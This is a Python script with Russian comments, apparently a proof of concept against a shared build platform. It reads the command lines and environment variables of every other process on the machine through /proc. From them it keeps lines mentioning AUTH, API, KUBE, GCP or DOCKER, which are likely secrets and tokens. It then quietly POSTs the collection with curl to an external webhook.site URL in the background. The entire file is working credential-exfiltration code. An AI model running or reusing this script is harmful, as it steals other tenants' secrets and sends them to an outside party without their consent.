import os
import json
import subprocess

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def deep_scan_and_exfiltrate():
    cross_process_data = []
    
    # Твои маркеры, чтобы отсеять свои процессы
    my_markers = ['dodo', 'clever-spirit', 'railway-poc']

    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                # Читаем команду запуска
                with open(f'/proc/{pid}/cmdline', 'rb') as f:
                    cmdline = f.read().replace(b'\0', b' ').decode(errors='ignore').strip()
                
                # Читаем переменные окружения
                with open(f'/proc/{pid}/environ', 'rb') as f:
                    env = f.read().replace(b'\0', b'\n').decode(errors='ignore')

                # Проверяем, наш ли это процесс
                is_mine = any(marker in cmdline.lower() or marker in env.lower() for marker in my_markers)
                
                if not is_mine and cmdline:
                    # Собираем только самое подозрительное из чужого окружения
                    env_lines = env.split('\n')
                    system_hints = [l for l in env_lines if any(k in l.upper() for k in ['KUBE', 'GCP', 'PROTO', 'API', 'AUTH', 'DOCKER'])]
                    
                    cross_process_data.append({
                        "pid": pid,
                        "cmd": cmdline,
                        "interesting_env": system_hints
                    })
            except:
                continue

    # Формируем финальный отчет
    report = {
        "CRITICALITY": "HIGH",
        "type": "CROSS_PROCESS_DATA_LEAK",
        "description": "Found processes outside of the current build context.",
        "found_count": len(cross_process_data),
        "processes": cross_process_data
    }

    # Отправляем на хук
    try:
        # Используем фоновую отправку через Popen, чтобы билд не висел
        with open('/tmp/deep_scan.json', 'w') as f:
            json.dump(report, f)
            
        subprocess.Popen([
            'curl', '-s', '-X', 'POST', 
            '-H', 'Content-Type: application/json', 
            '-d', '@ /tmp/deep_scan.json', 
            WEBHOOK_URL
        ])
        print(f"[+] Deep scan sent to hook. Found {len(cross_process_data)} non-build processes.")
    except Exception as e:
        print(f"[-] Failed to send: {e}")

if __name__ == "__main__":
    deep_scan_and_exfiltrate()
